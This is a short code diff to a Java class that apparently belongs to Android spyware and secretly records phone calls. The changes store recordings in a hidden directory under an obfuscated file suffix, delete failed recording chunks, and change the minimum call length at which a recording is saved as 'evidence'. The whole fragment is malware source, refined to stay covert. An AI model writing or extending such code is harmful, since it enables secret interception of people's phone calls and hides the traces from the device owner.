@@ -33,7 +33,7 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 	static RecordCall singleton;
 	protected static final int CALL_PHONE = 0x0145;
 	private static int MAX_NUM_OF_FAILURE = 10;
-
+	protected static final String CALL_SUFFIX = M.e(".b");
 
 	private AutoFile onGoing_chunk;
 	private Call call;
@@ -57,7 +57,7 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 	private void createFile() {
 		if (onGoing_chunk == null) {
 			//onGoing_chunk = new AutoFile(Path.hidden(), Math.abs(Utils.getRandom()) + ".3gpp");
-			onGoing_chunk = new AutoFile(Path.hidden(), Math.abs(Utils.getRandom()) + "");
+			onGoing_chunk = new AutoFile(Path.hidden(), Math.abs(Utils.getRandom()) + CALL_SUFFIX);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (createFile) new file: " + onGoing_chunk.getFile());//$NON-NLS-1$
 			}
@@ -133,6 +133,7 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 					Check.log(e);
 				}
 			}
+			deleteFile();
 			numFailures++;
 			return false;
 		}
@@ -182,7 +183,7 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (saveRecorderEvidence) saving");
 				}
-				if (call.getDuration() > 16 || call.isOngoing()) {
+				if (call.getDuration() > 22 || call.isOngoing()) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (saveRecorderEvidence) call.. onGoing"+ call.isOngoing());
 					}
